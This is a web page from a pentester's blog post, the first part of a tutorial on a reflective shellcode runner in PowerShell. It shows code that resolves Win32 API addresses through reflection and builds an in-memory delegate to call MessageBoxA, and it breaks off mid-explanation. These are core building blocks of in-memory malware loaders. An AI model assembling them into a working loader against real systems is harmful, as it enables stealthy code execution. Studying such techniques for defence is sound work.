<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Reflective shellcode runner in PowerShell" />
<meta property="og:locale" content="en" />
<meta name="description" content="Part 1 - Understanding the mechanics" />
<meta property="og:description" content="Part 1 - Understanding the mechanics" />
<link rel="canonical" href="http://0.0.0.0:4000/posts/ref-she-run-pwsh/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/ref-she-run-pwsh/" />
<meta property="og:site_name" content="innxrmxst" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-06-24T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Reflective shellcode runner in PowerShell" />
<meta name="twitter:site" content="@innxrmxst" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-12T16:25:18+02:00","datePublished":"2025-06-24T00:00:00+02:00","description":"Part 1 - Understanding the mechanics","headline":"Reflective shellcode runner in PowerShell","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/ref-she-run-pwsh/"},"url":"http://0.0.0.0:4000/posts/ref-she-run-pwsh/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Reflective shellcode runner in PowerShell | innxrmxst
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">



  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">innxrmxst</a>
    <p class="site-subtitle fst-italic mb-0">Pentester</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    

      
        <a
          href="https://github.com/innxrmxst"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/innxrmxst"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    

      
        <a
          href="javascript:location.href = 'mailto:' + ['innxrmxst','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/maksymh/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Reflective shellcode runner in PowerShell</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Reflective shellcode runner in PowerShell</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1750716000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jun 24, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1752330318"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jul 12, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/innxrmxst">innxrmxst</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2136 words"
>
  <em>11 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Reflective shellcode runner in PowerShell</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Reflective shellcode runner in PowerShell</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="part-1---understanding-the-mechanics"><span class="me-2">Part 1 - Understanding the mechanics</span><a href="#part-1---understanding-the-mechanics" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="lookupfunc-finding-windows-api-modules-and-functions"><span class="me-2">LookupFunc: finding Windows API modules and functions</span><a href="#lookupfunc-finding-windows-api-modules-and-functions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>We’ll examine how to call Windows API functions from PowerShell, starting with displaying a message box.</p>

<p>First, we need a way to locate functions in DLLs. We can use technique known as dynamic lookup. We will create the .NET assembly in memory.
To perform a dynamic lookup of function addresses the operating system provides two Win32 APIs called <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code>.</p>

<p><code class="language-plaintext highlighter-rouge">GetModuleHandle</code> obtains a handle to the specified DLL, which is the memory address of the DLL. To find address of specific function we need to pass the DLL handle and the desired function to <code class="language-plaintext highlighter-rouge">GetProcAddress</code> which will return the function address.</p>

<p>We are relaying on <code class="language-plaintext highlighter-rouge">GetAssemblies</code> to search preloaded assemblies in the PowerShell process. We will loop through all assemblies and invoke <code class="language-plaintext highlighter-rouge">GetTypes</code> to obtain methods and structures. When C# code wants to directly invoke Win32 APIs it must provide the Unsafe keyword. Any functions to be be used must be declared as static to avoid instantiation. All these methods are ments to be used internally by the .NET code. This blocks us calling them directly from PowerShell or C#. To call them indirectly we need to obtain reference to these functions but firstly we must obtain a reference to the <code class="language-plaintext highlighter-rouge">System.dll</code> assembly using the <code class="language-plaintext highlighter-rouge">Get-Type</code> method. This will allow to subsequently locate the <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code> methods inside this dll.</p>

<p><strong>Using <code class="language-plaintext highlighter-rouge">GetType</code> to obtain a reference to the <code class="language-plaintext highlighter-rouge">System.dll</code> assembly at runtime is an example of the Reflection technique.</strong></p>

<p>We can use internal <code class="language-plaintext highlighter-rouge">Invoke</code> method to call <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> and obtain the base address of an unmanaged DLL. The returned value is decimal and we transfer it into hexadecimal quivalent to obtain the actual memory address. The same applies to <code class="language-plaintext highlighter-rouge">GetProcAddress</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">LookupFunc</code> helper function does this by:</p>

<ul>
  <li>Accessing .NET’s internal methods through reflection</li>
  <li>Finding GetProcAddress (which locates function addresses)</li>
  <li>Returning the memory address of our desired function</li>
</ul>

<p>Function below locates memory addresses of function in DLL. We’ll use it to find <code class="language-plaintext highlighter-rouge">MessageBoxA</code> from <code class="language-plaintext highlighter-rouge">user32.dll</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">LookupFunc</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="w">
        </span><span class="nv">$moduleName</span><span class="p">,</span><span class="w">
        </span><span class="nv">$functionName</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="nv">$assem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.GetAssemblies</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> 
        </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="bp">$_</span><span class="o">.</span><span class="nf">GlobalAssemblyCache</span><span class="w"> </span><span class="o">-And</span><span class="w"> 
            </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Location</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">)[</span><span class="nt">-1</span><span class="p">]</span><span class="o">.</span><span class="nf">Equals</span><span class="p">(</span><span class="s1">'System.dll'</span><span class="p">)</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">)</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="p">)</span><span class="w">

    </span><span class="nv">$tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@()</span><span class="w">
    
    </span><span class="nv">$assem</span><span class="o">.</span><span class="nf">GetMethods</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="kr">If</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"GetProcAddress"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nv">$tmp</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="bp">$_</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
    
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="w"> </span><span class="c"># Using the first `GetProcAddress` function.</span><span class="w">
        </span><span class="bp">$null</span><span class="p">,</span><span class="w"> 
        </span><span class="p">@(</span><span class="w">
            </span><span class="err">(</span><span class="nv">$assem</span><span class="err">.GetMethod(</span><span class="s1">'GetModuleHandle'</span><span class="p">))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="w">
                </span><span class="bp">$null</span><span class="p">,</span><span class="w"> 
                </span><span class="p">@(</span><span class="nv">$moduleName</span><span class="p">)</span><span class="w">
            </span><span class="p">),</span><span class="w"> 
            </span><span class="nv">$functionName</span><span class="w">
        </span><span class="p">)</span><span class="w">
    </span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Formatted one, to use less lines of code:</p>

<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">LookupFunc</span><span class="w"> </span><span class="p">{</span><span class="w">
	</span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="nv">$moduleName</span><span class="p">,</span><span class="w"> </span><span class="nv">$functionName</span><span class="p">)</span><span class="w">
	</span><span class="nv">$assem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.GetAssemblies</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">GlobalAssemblyCache</span><span class="w"> </span><span class="o">-And</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Location</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">)[</span><span class="nt">-1</span><span class="p">]</span><span class="o">.</span><span class="nf">Equals</span><span class="p">(</span><span class="s1">'System.dll'</span><span class="p">)})</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="p">)</span><span class="w">
	</span><span class="nv">$tmp</span><span class="o">=</span><span class="p">@()</span><span class="w">
	</span><span class="nv">$assem</span><span class="o">.</span><span class="nf">GetMethods</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="kr">If</span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"GetProcAddress"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$tmp</span><span class="o">+=</span><span class="bp">$_</span><span class="p">}}</span><span class="w">
	</span><span class="kr">return</span><span class="w"> </span><span class="nv">$tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="err">(</span><span class="nv">$assem</span><span class="err">.GetMethod(</span><span class="s1">'GetModuleHandle'</span><span class="p">))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="nv">$moduleName</span><span class="p">)),</span><span class="w"> </span><span class="nv">$functionName</span><span class="p">))</span><span class="w">
	</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Later in our code, we will use it to save the result into a variable using format like so:</p>

<p><code class="language-plaintext highlighter-rouge">$Variable = LookupFunc "nameof.dll" "WinAPIFunctionName"</code></p>

<p><a href="https://i.imgur.com/ktAJtgs.png" class="popup img-link shimmer"><img src="https://i.imgur.com/ktAJtgs.png" alt="MessageBoxAddress" loading="lazy"></a></p>

<h3 id="delegatetype-reflection---calling-resolved-functions"><span class="me-2">DelegateType reflection - calling resolved functions</span><a href="#delegatetype-reflection---calling-resolved-functions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>We create a DelegateType reflection to call the resolved function from unmanaged module address.</p>

<p>The information about the number of arguments and their associated data types must be paired with the resolved function memory address. In C# this is done using the <code class="language-plaintext highlighter-rouge">GetDelegateForFunctionPointer</code> method. It takes two arguments - memory address of the function (which we already know how to obtain) and function protorype represented as a type that we need to create.</p>

<p>In <code class="language-plaintext highlighter-rouge">C#</code> a function prototype is known as <strong>Delegate</strong> or <strong>Delegate type</strong>.</p>

<p>Key steps:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">LookupFunc</code> finds <code class="language-plaintext highlighter-rouge">MessageBoxA</code> address in our example</li>
  <li>Creation of a new dynamic reflection assembly object</li>
  <li>Getting current AppDomain</li>
  <li>Defining dynamic assembly with executable permissions</li>
  <li>Creation of dynamic module object inside of assembly</li>
  <li>Custom type creation</li>
  <li>Defining constructor with MessageBoxA’s signature</li>
  <li>Setting implementation flags</li>
  <li>Creating Invoke method</li>
  <li>Creating delegate type instance</li>
  <li>GetDelegateForFunctionPointer (Connecting our native function pointer to the managed delegate)</li>
  <li>Calling the function</li>
</ul>

<p>This will result in a call to the function and message box will pop-up with our custom text.</p>

<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="nv">$MessageBoxA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LookupFunc</span><span class="w"> </span><span class="s2">"user32.dll"</span><span class="w"> </span><span class="s2">"MessageBoxA"</span><span class="w"> </span><span class="c"># Saving resolved address to the variable</span><span class="w">

</span><span class="c"># 1. Create a dynamic assembly to host our delegate</span><span class="w">

</span><span class="nv">$MyAssembly</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Reflection.AssemblyName</span><span class="p">(</span><span class="s1">'ReflectedDelegate'</span><span class="p">)</span><span class="w"> </span><span class="c"># Creating a new reflection assembly object with name 'ReflectedDelegate'</span><span class="w">

</span><span class="nv">$Domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain</span><span class="w"> </span><span class="c"># Retrieves the current application domain (AppDomain) in which the PowerShell session is running</span><span class="w">

</span><span class="nv">$MyAssemblyBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Domain</span><span class="o">.</span><span class="nf">DefineDynamicAssembly</span><span class="p">(</span><span class="nv">$MyAssembly</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Emit.AssemblyBuilderAccess</span><span class="p">]::</span><span class="nx">Run</span><span class="p">)</span><span class="w"> </span><span class="c"># Setting executable permissions on assembly. Specifies that the assembly can only be executed in memory and cannot be saved to disk</span><span class="w">

</span><span class="c"># 2. Create a module within the assembly</span><span class="w">

</span><span class="nv">$MyModuleBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyAssemblyBuilder</span><span class="o">.</span><span class="nf">DefineDynamicModule</span><span class="p">(</span><span class="s1">'InMemoryModule'</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">)</span><span class="w"> </span><span class="c"># Creating Module inside of assembly. Setting custom module name. Second $false argument will exclude symbol information.</span><span class="w">

</span><span class="c"># Now we can create a custom type that will become our delegate type.</span><span class="w">

</span><span class="c"># 3. Define our custom delegate type</span><span class="w">

</span><span class="nv">$MyTypeBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyModuleBuilder</span><span class="o">.</span><span class="nf">DefineType</span><span class="p">(</span><span class="s1">'MyDelegateType'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Class, Public, Sealed, AnsiClass, AutoClass'</span><span class="p">,[</span><span class="n">System.MulticastDelegate</span><span class="p">])</span><span class="w"> </span><span class="c"># The first argument is a custom name.</span><span class="w">
</span><span class="c"># Second is the list of attributes for the type. We set it to class so that later it can be instantiated. Public, non-executable and use ASCII instead of Unicode. Finally, it is set to be interpreted automatically since this undocumented setting is required.</span><span class="w">
</span><span class="c"># Third argument, we specify type it builds on top of. 'MulticastDelegate' will allow us to create a delegate type with multiple entries which will allow to call the target API with multiple arguments.</span><span class="w">

</span><span class="c"># Now we can put function prototype inside the newly created Type '$MyTypeBuilder' and let it become our custom delegate type.</span><span class="w">

</span><span class="c"># 4. Create constructor matching MessageBoxA signature</span><span class="w">

</span><span class="nv">$MyConstructorBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyTypeBuilder</span><span class="o">.</span><span class="nf">DefineConstructor</span><span class="p">(</span><span class="w">

	</span><span class="s1">'RTSpecialName, HideBySig, Public'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.CallingConventions</span><span class="p">]::</span><span class="n">Standard</span><span class="p">,</span><span class="w"> </span><span class="p">@([</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">])</span><span class="w">

</span><span class="p">)</span><span class="w">
</span><span class="c"># The first argument - atributes of the constructor itself. We make it Public and require it to be referenced by both name and signature by setting HideBySig, RTSpecialName and Public.</span><span class="w">
</span><span class="c"># The second arguemnt - calling convention for the constructor. This defines how arguments and return values are handles on the low level by .NET framework. (The default one is in use.</span><span class="w">
</span><span class="c"># The last argument - parameter types of the constructor that will become the function prototype. Basically, the arguments types of the function we would like to invoke.</span><span class="w">


</span><span class="c">#With the constructor created, we must call it. Before that, implementation flags must be set.  Runtime - used at runtime. Managed - the code is managed. =)</span><span class="w">

</span><span class="nv">$MyConstructorBuilder</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">

</span><span class="c"># Constructor is set up. No need to modify it or add anything else. But, in order to invoke it, we must tell .NET that delegate type to be used in calling a function. Let's define a separate thing, the Invoke method via 'DefineMethod' which takes settings of '$MyTypeBuilder'.</span><span class="w">

</span><span class="c"># DefineMethod takes 4 arguments.</span><span class="w">
</span><span class="c"># Name of the method. Method attributes. NewSlot and Virtual in second arg used to indicate that the method is virtual and ensure it always gets a new slot in the vtable.</span><span class="w">
